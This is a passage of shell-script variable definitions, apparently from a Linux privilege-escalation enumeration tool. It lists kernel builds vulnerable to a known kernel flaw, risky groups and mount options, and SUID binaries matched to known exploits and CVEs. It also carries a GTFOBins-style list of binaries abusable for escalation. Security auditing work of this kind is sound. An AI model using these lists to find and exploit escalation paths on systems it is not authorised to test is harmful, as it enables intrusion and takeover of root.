kernelDCW_Rhel5_1="2.6.24.7-74.el5rt|2.6.24.7-81.el5rt|2.6.24.7-93.el5rt|2.6.24.7-101.el5rt|2.6.24.7-108.el5rt|2.6.24.7-111.el5rt|2.6.24.7-117.el5rt|2.6.24.7-126.el5rt|2.6.24.7-132.el5rt|2.6.24.7-137.el5rt|2.6.24.7-139.el5rt|2.6.24.7-146.el5rt|2.6.24.7-149.el5rt|2.6.24.7-161.el5rt|2.6.24.7-169.el5rt|2.6.33.7-rt29.45.el5rt|2.6.33.7-rt29.47.el5rt|2.6.33.7-rt29.55.el5rt|2.6.33.9-rt31.64.el5rt|2.6.33.9-rt31.67.el5rt|2.6.33.9-rt31.86.el5rt|2.6.18-8.1.1.el5|2.6.18-8.1.3.el5|2.6.18-8.1.4.el5|2.6.18-8.1.6.el5|2.6.18-8.1.8.el5|2.6.18-8.1.10.el5|2.6.18-8.1.14.el5|2.6.18-8.1.15.el5|2.6.18-53.el5|2.6.18-53.1.4.el5|2.6.18-53.1.6.el5|2.6.18-53.1.13.el5|2.6.18-53.1.14.el5|2.6.18-53.1.19.el5|2.6.18-53.1.21.el5|2.6.18-92.el5|2.6.18-92.1.1.el5|2.6.18-92.1.6.el5|2.6.18-92.1.10.el5|2.6.18-92.1.13.el5|2.6.18-92.1.18.el5|2.6.18-92.1.22.el5|2.6.18-92.1.24.el5|2.6.18-92.1.26.el5|2.6.18-92.1.27.el5|2.6.18-92.1.28.el5|2.6.18-92.1.29.el5|2.6.18-92.1.32.el5|2.6.18-92.1.35.el5|2.6.18-92.1.38.el5|2.6.18-128.el5|2.6.18-128.1.1.el5|2.6.18-128.1.6.el5|2.6.18-128.1.10.el5|2.6.18-128.1.14.el5|2.6.18-128.1.16.el5|2.6.18-128.2.1.el5|2.6.18-128.4.1.el5|2.6.18-128.4.1.el5|2.6.18-128.7.1.el5|2.6.18-128.8.1.el5|2.6.18-128.11.1.el5|2.6.18-128.12.1.el5|2.6.18-128.14.1.el5|2.6.18-128.16.1.el5|2.6.18-128.17.1.el5|2.6.18-128.18.1.el5|2.6.18-128.23.1.el5|2.6.18-128.23.2.el5|2.6.18-128.25.1.el5|2.6.18-128.26.1.el5|2.6.18-128.27.1.el5"
kernelDCW_Rhel5_2="2.6.18-128.29.1.el5|2.6.18-128.30.1.el5|2.6.18-128.31.1.el5|2.6.18-128.32.1.el5|2.6.18-128.35.1.el5|2.6.18-128.36.1.el5|2.6.18-128.37.1.el5|2.6.18-128.38.1.el5|2.6.18-128.39.1.el5|2.6.18-128.40.1.el5|2.6.18-128.41.1.el5|2.6.18-164.el5|2.6.18-164.2.1.el5|2.6.18-164.6.1.el5|2.6.18-164.9.1.el5|2.6.18-164.10.1.el5|2.6.18-164.11.1.el5|2.6.18-164.15.1.el5|2.6.18-164.17.1.el5|2.6.18-164.19.1.el5|2.6.18-164.21.1.el5|2.6.18-164.25.1.el5|2.6.18-164.25.2.el5|2.6.18-164.28.1.el5|2.6.18-164.30.1.el5|2.6.18-164.32.1.el5|2.6.18-164.34.1.el5|2.6.18-164.36.1.el5|2.6.18-164.37.1.el5|2.6.18-164.38.1.el5|2.6.18-194.el5|2.6.18-194.3.1.el5|2.6.18-194.8.1.el5|2.6.18-194.11.1.el5|2.6.18-194.11.3.el5|2.6.18-194.11.4.el5|2.6.18-194.17.1.el5|2.6.18-194.17.4.el5|2.6.18-194.26.1.el5|2.6.18-194.32.1.el5|2.6.18-238.el5|2.6.18-238.1.1.el5|2.6.18-238.5.1.el5|2.6.18-238.9.1.el5|2.6.18-238.12.1.el5|2.6.18-238.19.1.el5|2.6.18-238.21.1.el5|2.6.18-238.27.1.el5|2.6.18-238.28.1.el5|2.6.18-238.31.1.el5|2.6.18-238.33.1.el5|2.6.18-238.35.1.el5|2.6.18-238.37.1.el5|2.6.18-238.39.1.el5|2.6.18-238.40.1.el5|2.6.18-238.44.1.el5|2.6.18-238.45.1.el5|2.6.18-238.47.1.el5|2.6.18-238.48.1.el5|2.6.18-238.49.1.el5|2.6.18-238.50.1.el5|2.6.18-238.51.1.el5|2.6.18-238.52.1.el5|2.6.18-238.53.1.el5|2.6.18-238.54.1.el5|2.6.18-238.55.1.el5|2.6.18-238.56.1.el5|2.6.18-274.el5|2.6.18-274.3.1.el5|2.6.18-274.7.1.el5|2.6.18-274.12.1.el5"
kernelDCW_Rhel5_3="2.6.18-274.17.1.el5|2.6.18-274.18.1.el5|2.6.18-308.el5|2.6.18-308.1.1.el5|2.6.18-308.4.1.el5|2.6.18-308.8.1.el5|2.6.18-308.8.2.el5|2.6.18-308.11.1.el5|2.6.18-308.13.1.el5|2.6.18-308.16.1.el5|2.6.18-308.20.1.el5|2.6.18-308.24.1.el5|2.6.18-348.el5|2.6.18-348.1.1.el5|2.6.18-348.2.1.el5|2.6.18-348.3.1.el5|2.6.18-348.4.1.el5|2.6.18-348.6.1.el5|2.6.18-348.12.1.el5|2.6.18-348.16.1.el5|2.6.18-348.18.1.el5|2.6.18-348.19.1.el5|2.6.18-348.21.1.el5|2.6.18-348.22.1.el5|2.6.18-348.23.1.el5|2.6.18-348.25.1.el5|2.6.18-348.27.1.el5|2.6.18-348.28.1.el5|2.6.18-348.29.1.el5|2.6.18-348.30.1.el5|2.6.18-348.31.2.el5|2.6.18-371.el5|2.6.18-371.1.2.el5|2.6.18-371.3.1.el5|2.6.18-371.4.1.el5|2.6.18-371.6.1.el5|2.6.18-371.8.1.el5|2.6.18-371.9.1.el5|2.6.18-371.11.1.el5|2.6.18-371.12.1.el5|2.6.18-398.el5|2.6.18-400.el5|2.6.18-400.1.1.el5|2.6.18-402.el5|2.6.18-404.el5|2.6.18-406.el5|2.6.18-407.el5|2.6.18-408.el5|2.6.18-409.el5|2.6.18-410.el5|2.6.18-411.el5|2.6.18-412.el5"
kernelDCW_Rhel6_1="2.6.33.9-rt31.66.el6rt|2.6.33.9-rt31.74.el6rt|2.6.33.9-rt31.75.el6rt|2.6.33.9-rt31.79.el6rt|3.0.9-rt26.45.el6rt|3.0.9-rt26.46.el6rt|3.0.18-rt34.53.el6rt|3.0.25-rt44.57.el6rt|3.0.30-rt50.62.el6rt|3.0.36-rt57.66.el6rt|3.2.23-rt37.56.el6rt|3.2.33-rt50.66.el6rt|3.6.11-rt28.20.el6rt|3.6.11-rt30.25.el6rt|3.6.11.2-rt33.39.el6rt|3.6.11.5-rt37.55.el6rt|3.8.13-rt14.20.el6rt|3.8.13-rt14.25.el6rt|3.8.13-rt27.33.el6rt|3.8.13-rt27.34.el6rt|3.8.13-rt27.40.el6rt|3.10.0-229.rt56.144.el6rt|3.10.0-229.rt56.147.el6rt|3.10.0-229.rt56.149.el6rt|3.10.0-229.rt56.151.el6rt|3.10.0-229.rt56.153.el6rt|3.10.0-229.rt56.158.el6rt|3.10.0-229.rt56.161.el6rt|3.10.0-229.rt56.162.el6rt|3.10.0-327.rt56.170.el6rt|3.10.0-327.rt56.171.el6rt|3.10.0-327.rt56.176.el6rt|3.10.0-327.rt56.183.el6rt|3.10.0-327.rt56.190.el6rt|3.10.0-327.rt56.194.el6rt|3.10.0-327.rt56.195.el6rt|3.10.0-327.rt56.197.el6rt|3.10.33-rt32.33.el6rt|3.10.33-rt32.34.el6rt|3.10.33-rt32.43.el6rt|3.10.33-rt32.45.el6rt|3.10.33-rt32.51.el6rt|3.10.33-rt32.52.el6rt|3.10.58-rt62.58.el6rt|3.10.58-rt62.60.el6rt|2.6.32-71.7.1.el6|2.6.32-71.14.1.el6|2.6.32-71.18.1.el6|2.6.32-71.18.2.el6|2.6.32-71.24.1.el6|2.6.32-71.29.1.el6|2.6.32-71.31.1.el6|2.6.32-71.34.1.el6|2.6.32-71.35.1.el6|2.6.32-71.36.1.el6|2.6.32-71.37.1.el6|2.6.32-71.38.1.el6|2.6.32-71.39.1.el6|2.6.32-71.40.1.el6|2.6.32-131.0.15.el6|2.6.32-131.2.1.el6|2.6.32-131.4.1.el6|2.6.32-131.6.1.el6|2.6.32-131.12.1.el6"
kernelDCW_Rhel6_2="2.6.32-131.17.1.el6|2.6.32-131.21.1.el6|2.6.32-131.22.1.el6|2.6.32-131.25.1.el6|2.6.32-131.26.1.el6|2.6.32-131.28.1.el6|2.6.32-131.29.1.el6|2.6.32-131.30.1.el6|2.6.32-131.30.2.el6|2.6.32-131.33.1.el6|2.6.32-131.35.1.el6|2.6.32-131.36.1.el6|2.6.32-131.37.1.el6|2.6.32-131.38.1.el6|2.6.32-131.39.1.el6|2.6.32-220.el6|2.6.32-220.2.1.el6|2.6.32-220.4.1.el6|2.6.32-220.4.2.el6|2.6.32-220.4.7.bgq.el6|2.6.32-220.7.1.el6|2.6.32-220.7.3.p7ih.el6|2.6.32-220.7.4.p7ih.el6|2.6.32-220.7.6.p7ih.el6|2.6.32-220.7.7.p7ih.el6|2.6.32-220.13.1.el6|2.6.32-220.17.1.el6|2.6.32-220.23.1.el6|2.6.32-220.24.1.el6|2.6.32-220.25.1.el6|2.6.32-220.26.1.el6|2.6.32-220.28.1.el6|2.6.32-220.30.1.el6|2.6.32-220.31.1.el6|2.6.32-220.32.1.el6|2.6.32-220.34.1.el6|2.6.32-220.34.2.el6|2.6.32-220.38.1.el6|2.6.32-220.39.1.el6|2.6.32-220.41.1.el6|2.6.32-220.42.1.el6|2.6.32-220.45.1.el6|2.6.32-220.46.1.el6|2.6.32-220.48.1.el6|2.6.32-220.51.1.el6|2.6.32-220.52.1.el6|2.6.32-220.53.1.el6|2.6.32-220.54.1.el6|2.6.32-220.55.1.el6|2.6.32-220.56.1.el6|2.6.32-220.57.1.el6|2.6.32-220.58.1.el6|2.6.32-220.60.2.el6|2.6.32-220.62.1.el6|2.6.32-220.63.2.el6|2.6.32-220.64.1.el6|2.6.32-220.65.1.el6|2.6.32-220.66.1.el6|2.6.32-220.67.1.el6|2.6.32-279.el6|2.6.32-279.1.1.el6|2.6.32-279.2.1.el6|2.6.32-279.5.1.el6|2.6.32-279.5.2.el6|2.6.32-279.9.1.el6|2.6.32-279.11.1.el6|2.6.32-279.14.1.bgq.el6|2.6.32-279.14.1.el6|2.6.32-279.19.1.el6|2.6.32-279.22.1.el6|2.6.32-279.23.1.el6|2.6.32-279.25.1.el6|2.6.32-279.25.2.el6|2.6.32-279.31.1.el6|2.6.32-279.33.1.el6|2.6.32-279.34.1.el6|2.6.32-279.37.2.el6|2.6.32-279.39.1.el6"
kernelDCW_Rhel6_3="2.6.32-279.41.1.el6|2.6.32-279.42.1.el6|2.6.32-279.43.1.el6|2.6.32-279.43.2.el6|2.6.32-279.46.1.el6|2.6.32-358.el6|2.6.32-358.0.1.el6|2.6.32-358.2.1.el6|2.6.32-358.6.1.el6|2.6.32-358.6.2.el6|2.6.32-358.6.3.p7ih.el6|2.6.32-358.11.1.bgq.el6|2.6.32-358.11.1.el6|2.6.32-358.14.1.el6|2.6.32-358.18.1.el6|2.6.32-358.23.2.el6|2.6.32-358.28.1.el6|2.6.32-358.32.3.el6|2.6.32-358.37.1.el6|2.6.32-358.41.1.el6|2.6.32-358.44.1.el6|2.6.32-358.46.1.el6|2.6.32-358.46.2.el6|2.6.32-358.48.1.el6|2.6.32-358.49.1.el6|2.6.32-358.51.1.el6|2.6.32-358.51.2.el6|2.6.32-358.55.1.el6|2.6.32-358.56.1.el6|2.6.32-358.59.1.el6|2.6.32-358.61.1.el6|2.6.32-358.62.1.el6|2.6.32-358.65.1.el6|2.6.32-358.67.1.el6|2.6.32-358.68.1.el6|2.6.32-358.69.1.el6|2.6.32-358.70.1.el6|2.6.32-358.71.1.el6|2.6.32-358.72.1.el6|2.6.32-358.73.1.el6|2.6.32-358.111.1.openstack.el6|2.6.32-358.114.1.openstack.el6|2.6.32-358.118.1.openstack.el6|2.6.32-358.123.4.openstack.el6|2.6.32-431.el6|2.6.32-431.1.1.bgq.el6|2.6.32-431.1.2.el6|2.6.32-431.3.1.el6|2.6.32-431.5.1.el6|2.6.32-431.11.2.el6|2.6.32-431.17.1.el6|2.6.32-431.20.3.el6|2.6.32-431.20.5.el6|2.6.32-431.23.3.el6|2.6.32-431.29.2.el6|2.6.32-431.37.1.el6|2.6.32-431.40.1.el6|2.6.32-431.40.2.el6|2.6.32-431.46.2.el6|2.6.32-431.50.1.el6|2.6.32-431.53.2.el6|2.6.32-431.56.1.el6|2.6.32-431.59.1.el6|2.6.32-431.61.2.el6|2.6.32-431.64.1.el6|2.6.32-431.66.1.el6|2.6.32-431.68.1.el6|2.6.32-431.69.1.el6|2.6.32-431.70.1.el6"
kernelDCW_Rhel6_4="2.6.32-431.71.1.el6|2.6.32-431.72.1.el6|2.6.32-431.73.2.el6|2.6.32-431.74.1.el6|2.6.32-504.el6|2.6.32-504.1.3.el6|2.6.32-504.3.3.el6|2.6.32-504.8.1.el6|2.6.32-504.8.2.bgq.el6|2.6.32-504.12.2.el6|2.6.32-504.16.2.el6|2.6.32-504.23.4.el6|2.6.32-504.30.3.el6|2.6.32-504.30.5.p7ih.el6|2.6.32-504.33.2.el6|2.6.32-504.36.1.el6|2.6.32-504.38.1.el6|2.6.32-504.40.1.el6|2.6.32-504.43.1.el6|2.6.32-504.46.1.el6|2.6.32-504.49.1.el6|2.6.32-504.50.1.el6|2.6.32-504.51.1.el6|2.6.32-504.52.1.el6|2.6.32-573.el6|2.6.32-573.1.1.el6|2.6.32-573.3.1.el6|2.6.32-573.4.2.bgq.el6|2.6.32-573.7.1.el6|2.6.32-573.8.1.el6|2.6.32-573.12.1.el6|2.6.32-573.18.1.el6|2.6.32-573.22.1.el6|2.6.32-573.26.1.el6|2.6.32-573.30.1.el6|2.6.32-573.32.1.el6|2.6.32-573.34.1.el6|2.6.32-642.el6|2.6.32-642.1.1.el6|2.6.32-642.3.1.el6|2.6.32-642.4.2.el6|2.6.32-642.6.1.el6"
kernelDCW_Rhel7="3.10.0-229.rt56.141.el7|3.10.0-229.1.2.rt56.141.2.el7_1|3.10.0-229.4.2.rt56.141.6.el7_1|3.10.0-229.7.2.rt56.141.6.el7_1|3.10.0-229.11.1.rt56.141.11.el7_1|3.10.0-229.14.1.rt56.141.13.el7_1|3.10.0-229.20.1.rt56.141.14.el7_1|3.10.0-229.rt56.141.el7|3.10.0-327.rt56.204.el7|3.10.0-327.4.5.rt56.206.el7_2|3.10.0-327.10.1.rt56.211.el7_2|3.10.0-327.13.1.rt56.216.el7_2|3.10.0-327.18.2.rt56.223.el7_2|3.10.0-327.22.2.rt56.230.el7_2|3.10.0-327.28.2.rt56.234.el7_2|3.10.0-327.28.3.rt56.235.el7|3.10.0-327.36.1.rt56.237.el7|3.10.0-123.el7|3.10.0-123.1.2.el7|3.10.0-123.4.2.el7|3.10.0-123.4.4.el7|3.10.0-123.6.3.el7|3.10.0-123.8.1.el7|3.10.0-123.9.2.el7|3.10.0-123.9.3.el7|3.10.0-123.13.1.el7|3.10.0-123.13.2.el7|3.10.0-123.20.1.el7|3.10.0-229.el7|3.10.0-229.1.2.el7|3.10.0-229.4.2.el7|3.10.0-229.7.2.el7|3.10.0-229.11.1.el7|3.10.0-229.14.1.el7|3.10.0-229.20.1.el7|3.10.0-229.24.2.el7|3.10.0-229.26.2.el7|3.10.0-229.28.1.el7|3.10.0-229.30.1.el7|3.10.0-229.34.1.el7|3.10.0-229.38.1.el7|3.10.0-229.40.1.el7|3.10.0-229.42.1.el7|3.10.0-327.el7|3.10.0-327.3.1.el7|3.10.0-327.4.4.el7|3.10.0-327.4.5.el7|3.10.0-327.10.1.el7|3.10.0-327.13.1.el7|3.10.0-327.18.2.el7|3.10.0-327.22.2.el7|3.10.0-327.28.2.el7|3.10.0-327.28.3.el7|3.10.0-327.36.1.el7|3.10.0-327.36.2.el7|3.10.0-229.1.2.ael7b|3.10.0-229.4.2.ael7b|3.10.0-229.7.2.ael7b|3.10.0-229.11.1.ael7b|3.10.0-229.14.1.ael7b|3.10.0-229.20.1.ael7b|3.10.0-229.24.2.ael7b|3.10.0-229.26.2.ael7b|3.10.0-229.28.1.ael7b|3.10.0-229.30.1.ael7b|3.10.0-229.34.1.ael7b|3.10.0-229.38.1.ael7b|3.10.0-229.40.1.ael7b|3.10.0-229.42.1.ael7b|4.2.0-0.21.el7"


MyUID=`id -u $(whoami)`
if [ `echo $MyUID` ]; then myuid=$MyUID; elif [ `id -u $(whoami) 2>/dev/null` ]; then myuid=`id -u $(whoami) 2>/dev/null`; elif [ `id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1` ]; then myuid=`id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1`; fi
if [ $myuid -gt 2147483646 ]; then baduid="|$myuid"; fi
idB="euid|egid$baduid"
sudovB="[01].[012345678].[0-9]+|1.9.[01234]|1.9.5p1"

mounted=`(mount -l || cat /proc/mounts || cat /proc/self/mounts) 2>/dev/null | grep "^/" | cut -d " " -f1 | tr '\n' '|'``cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}'`
if ! [ "$mounted" ]; then mounted="ImPoSSssSiBlEee"; fi #Don't let any blacklist to be empty
mountG="swap|/cdrom|/floppy|/dev/shm"
notmounted=`cat /etc/fstab 2>/dev/null | grep "^/" | grep -Ev "$mountG" | awk '{print $1}' | grep -Ev "$mounted" | tr '\n' '|'`"ImPoSSssSiBlEee"
mountpermsB="\Wsuid|\Wuser|\Wexec"
mountpermsG="nosuid|nouser|noexec"

rootcommon="/init$|upstart-udev-bridge|udev|/getty|cron|apache2|java|tomcat|/vmtoolsd|/VGAuthService"

groupsB="\(root\)|\(shadow\)|\(admin\)|\(video\)|\(adm\)|\(wheel\)|\(auth\)"
groupsVB="\(sudo\)|\(docker\)|\(lxd\)|\(disk\)|\(lxc\)"
knw_grps='\(lpadmin\)|\(cdrom\)|\(plugdev\)|\(nogroup\)' #https://www.togaware.com/linux/survivor/Standard_Groups.html
mygroups=`groups 2>/dev/null | tr " " "|"`

sidG1="/abuild-sudo$|/accton$|/allocate$|/ARDAgent|/arping$|/atq$|/atrm$|/authpf$|/authpf-noip$|/authopen$|/batch$|/bbsuid$|/bsd-write$|/btsockstat$|/bwrap$|/cacaocsc$|/camel-lock-helper-1.2$|/ccreds_validate$|/cdrw$|/chage$|/check-foreground-console$|/chrome-sandbox$|/chsh$|/cons.saver$|/crontab$|/ct$|/cu$|/dbus-daemon-launch-helper$|/deallocate$|/desktop-create-kmenu$|/dma$|/dma-mbox-create$|/dmcrypt-get-device$|/doas$|/dotlockfile$|/dotlock.mailutils$|/dtaction$|/dtfile$|/eject$|/execabrt-action-install-debuginfo-to-abrt-cache$|/execdbus-daemon-launch-helper$|/execdma-mbox-create$|/execlockspool$|/execlogin_chpass$|/execlogin_lchpass$|/execlogin_passwd$|/execssh-keysign$|/execulog-helper$|/exim4|/expiry$|/fdformat$|/fstat$|/fusermount$|/fusermount3$|/gnome-pty-helper$|/glines$|/gnibbles$|/gnobots2$|/gnome-suspend$|/gnometris$|/gnomine$|/gnotski$|/gnotravex$|/gpasswd$|/gpg$|/gpio$|/gtali|/.hal-mtab-lock$|/imapd$|/inndstart$|/kismet_cap_nrf_51822$|/kismet_cap_nxp_kw41z$|/kismet_cap_ti_cc_2531$|/kismet_cap_ti_cc_2540$|/kismet_cap_ubertooth_one$|/kismet_capture$|/kismet_cap_linux_bluetooth$|/kismet_cap_linux_wifi$|/kismet_cap_nrf_mousejack$|/ksu$|/list_devices$|/locate$|/lock$|/lockdev$|/lockfile$|/login_activ$|/login_crypto$|/login_radius$|/login_skey$|/login_snk$|/login_token$|/login_yubikey$|/lpc$|/lpd$|/lpd-port$|/lppasswd$|/lpq$|/lpr$|/lprm$|/lpset$|/lxc-user-nic$|/mahjongg$|/mail-lock$|/mailq$|/mail-touchlock$|/mail-unlock$|/mksnap_ffs$|/mlocate$|/mlock$|/mount.cifs$|/mount.nfs$|/mount.nfs4$|/mtr$|/mutt_dotlock$"
sidG2="/ncsa_auth$|/netpr$|/netkit-rcp$|/netkit-rlogin$|/netkit-rsh$|/netreport$|/netstat$|/newgidmap$|/newtask$|/newuidmap$|/nvmmctl$|/opieinfo$|/opiepasswd$|/pam_auth$|/pam_extrausers_chkpwd$|/pam_timestamp_check$|/pamverifier$|/pfexec$|/ping$|/ping6$|/pmconfig$|/pmap$|/polkit-agent-helper-1$|/polkit-explicit-grant-helper$|/polkit-grant-helper$|/polkit-grant-helper-pam$|/polkit-read-auth-helper$|/polkit-resolve-exe-helper$|/polkit-revoke-helper$|/polkit-set-default-helper$|/postdrop$|/postqueue$|/poweroff$|/ppp$|/procmail$|/pstat$|/pt_chmod$|/pwdb_chkpwd$|/quota$|/rcmd|/remote.unknown$|/rlogin$|/rmformat$|/rnews$|/run-mailcap$|/sacadm$|/same-gnome$|screen.real$|/security_authtrampoline$|/sendmail.sendmail$|/shutdown$|/skeyaudit$|/skeyinfo$|/skeyinit$|/sliplogin|/slocate$|/smbmnt$|/smbumount$|/smpatch$|/smtpctl$|/snap-confine$|/sperl5.8.8$|/ssh-agent$|/ssh-keysign$|/staprun$|/startinnfeed$|/stclient$|/su$|/suexec$|/sys-suspend$|/sysstat$|/systat$|/telnetlogin$|/timedc$|/tip$|/top$|/traceroute6$|/traceroute6.iputils$|/trpt$|/tsoldtlabel$|/tsoljdslabel$|/tsolxagent$|/ufsdump$|/ufsrestore$|/ulog-helper$|/umount.cifs$|/umount.nfs$|/umount.nfs4$|/unix_chkpwd$|/uptime$|/userhelper$|/userisdnctl$|/usernetctl$|/utempter$|/utmp_update$|/uucico$|/uuglist$|/uuidd$|/uuname$|/uusched$|/uustat$|/uux$|/uuxqt$|/vmstat$|/vmware-user-suid-wrapper$|/vncserver-x11$|/volrmmount$|/w$|/wall$|/whodo$|/write$|/X$|/Xorg.wrap$|/Xsun$|/Xvnc$|/yppasswd$"

#Rules: Start path " /", end path "$", divide path and vulnversion "%". SPACE IS ONLY ALLOWED AT BEGINNING, DONT USE IT IN VULN DESCRIPTION
sidB="/apache2$%Read_root_passwd__apache2_-f_/etc/shadow\(CVE-2019-0211\)\
 /at$%RTru64_UNIX_4.0g\(CVE-2002-1614\)\
 /abrt-action-install-debuginfo-to-abrt-cache$%CENTOS 7.1/Fedora22
 /chfn$%SuSE_9.3/10\
 /chkey$%Solaris_2.5.1\
 /chkperm$%Solaris_7.0_\
 /chpass$%2Vulns:OpenBSD_6.1_to_OpenBSD 6.6\(CVE-2019-19726\)--OpenBSD_2.7_i386/OpenBSD_2.6_i386/OpenBSD_2.5_1999/08/06/OpenBSD_2.5_1998/05/28/FreeBSD_4.0-RELEASE/FreeBSD_3.5-RELEASE/FreeBSD_3.4-RELEASE/NetBSD_1.4.2\
 /chpasswd$%SquirrelMail\(2004-04\)\
 /dtappgather$%Solaris_7_<_11_\(SPARC/x86\)\(CVE-2017-3622\)\
 /dtprintinfo$%Solaris_10_\(x86\)_and_lower_versions_also_SunOS_5.7_to_5.10\
 /dtsession$%Oracle_Solaris_10_1/13_and_earlier\(CVE-2020-2696\)\
 /eject$%FreeBSD_mcweject_0.9/SGI_IRIX_6.2\
 /ibstat$%IBM_AIX_Version_6.1/7.1\(09-2013\)\
 /kcheckpass$%KDE_3.2.0_<-->_3.4.2_\(both_included\)\
 /kdesud$%KDE_1.1/1.1.1/1.1.2/1.2\
 /keybase-redirector%CentOS_Linux_release_7.4.1708\
 /login$%IBM_AIX_3.2.5/SGI_IRIX_6.4\
 /lpc$%S.u.S.E_Linux_5.2\
 /lpr$%BSD/OS2.1/FreeBSD2.1.5/NeXTstep4.x/IRIX6.4/SunOS4.1.3/4.1.4\(09-1996\)\
 /mail.local$%NetBSD_7.0-7.0.1__6.1-6.1.5__6.0-6.0.6
 /mount$%Apple_Mac_OSX\(Lion\)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\
 /movemail$%Emacs\(08-1986\)\
 /mrinfo$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /mtrace$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /netprint$%IRIX_5.3/6.2/6.3/6.4/6.5/6.5.11\
 /newgrp$%HP-UX_10.20\
 /ntfs-3g$%Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others\(02-2017\)\
 /passwd$%Apple_Mac_OSX\(03-2006\)/Solaris_8/9\(12-2004\)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1\(02-1997\)\
 /pkexec$%Linux4.10_to_5.1.17\(CVE-2019-13272\)/rhel_6\(CVE-2011-1485\)\
 /pppd$%Apple_Mac_OSX_10.4.8\(05-2007\)\
 /pt_chown$%GNU_glibc_2.1/2.1.1_-6\(08-1999\)\
 /pulseaudio$%\(Ubuntu_9.04/Slackware_12.2.0\)\
 /rcp$%RedHat_6.2\
 /rdist$%Solaris_10/OpenSolaris\
 /rsh$%Apple_Mac_OSX_10.9.5/10.10.5\(09-2015\)\
 /screen$%GNU_Screen_4.5.0\
 /sdtcm_convert$%Sun_Solaris_7.0\
 /sendmail$%Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_\(SGI_ProPack_1.2/1.3\)\
 /check_sudo_version$\
 /sudoedit$%Sudo/SudoEdit_1.6.9p21/1.7.2p4/\(RHEL_5/6/7/Ubuntu\)/Sudo<=1.8.14\
 /tmux$%Tmux_1.3_1.4_privesc\(CVE-2011-1496\)\
 /traceroute$%LBL_Traceroute_\[2000-11-15\]\
 /ubuntu-core-launcher$%Befre_1.0.27.1\(CVE-2016-1580\)\
 /umount$%BSD/Linux\(08-1996\)\
 /umount-loop$%Rocks_Clusters<=4.1\(07-2006\)\
 /uucp$%Taylor_UUCP_1.0.6\
 /XFree86$%XFree86_X11R6_3.3.x/4.0/4.x/3.3\(03-2003\)\
 /xlock$%BSD/OS_2.1/DG/UX_7.0/Debian_1.3/HP-UX_10.34/IBM_AIX_4.2/SGI_IRIX_6.4/Solaris_2.5.1\(04-1997\)\
 /xscreensaver%Solaris_11.x\(CVE-2019-3010\)\
 /xorg$%Xorg_1.19_to_1.20.x\(CVE_2018-14665\)/xorg-x11-server<=1.20.3/AIX_7.1_\(6.x_to_7.x_should_be_vulnerable\)_X11.base.rte<7.1.5.32_and_\
 /xterm$%Solaris_5.5.1_X11R6.3\(05-1997\)/Debian_xterm_version_222-1etch2\(01-2009\)"
#To update sidVB: curl https://github.com/GTFOBins/GTFOBins.github.io/tree/master/_gtfobins 2>/dev/null | grep 'href="/GTFOBins/' | grep '.md">' | awk -F 'title="' '{print $2}' | cut -d '"' -f1 | cut -d "." -f1 | sed  -e 's,^,/,' | sed  -e 's,$,\$,' | tr '\n' '|'
sidVB='/apt-get$|/apt$|/aria2c$|/arp$|/ash$|/awk$|/base32$|/base64$|/bash$|/bpftrace$|/bundler$|/busctl$|/busybox$|/byebug$|/cancel$|/cat$|/chmod$|/chown$|/chroot$|/cobc$|/composer$|/cp$|/cpan$|/cpulimit$|/crash$|/crontab$|/csh$|/curl$|/cut$|/dash$|/date$|/dd$|/dialog$|/diff$|/dmesg$|/dmsetup$|/dnf$|/docker$|/dpkg$|/easy_install$|/eb$|/ed$|/emacs$|/env$|/eqn$|/expand$|/expect$|/facter$|/file$|/find$|/finger$|/flock$|/fmt$|/fold$|/ftp$|/gawk$|/gcc$|/gdb$|/gem$|/genisoimage$|/ghc$|/ghci$|/gimp$|/git$|/grep$|/gtester$|/hd$|/head$|/hexdump$|/highlight$|/iconv$|/iftop$|/ionice$|/ip$|/irb$|/jjs$|/journalctl$|/jq$|/jrunscript$|/ksh$|/ksshell$|/ld$|/ldconfig$|/less$|/logsave$|/look$|/ltrace$|/lua$|/lwp-download$|/lwp-request$|/mail$|/make$|/man$|/mawk$|/more$|/mount$|/mtr$|/mv$|/mysql$|/nano$|/nawk$|/nc$|/nice$|/nl$|/nmap$|/node$|/nohup$|/nroff$|/nsenter$|/od$|/openssl$|/pdb$|/perl$|/pg$|/php$|/pic$|/pico$|/pip$|/pkexec$|/pry$|/puppet$|/python$|/rake$|/readelf$|/red$|/redcarpet$|/restic$|/rlogin$|/rlwrap$|/rpm$|/rpmquery$|/rsync$|/ruby$|/run-mailcap$|/run-parts$|/rview$|/rvim$|/scp$|/screen$|/script$|/sed$|/service$|/setarch$|/sftp$|/shuf$|/smbclient$|/socat$|/soelim$|/sort$|/sqlite3$|/ssh$|/start-stop-daemon$|/stdbuf$|/strace$|/strings$|/su$|/sysctl$|/systemctl$|/tac$|/tail$|/tar$|/taskset$|/tclsh$|/tcpdump$|/tee$|/telnet$|/tftp$|/time$|/timeout$|/tmux$|/top$|/ul$|/unexpand$|/uniq$|/unshare$|/uudecode$|/uuencode$|/valgrind$|/vi$|/view$|/vim$|/watch$|/wget$|/whois$|/wish$|/xargs$|/xxd$|/xz$|/yelp$|/yum$|/zip$|/zsh$|/zsoelim$|/zypper$'
cfuncs='file|free|main|more|read|split|write'

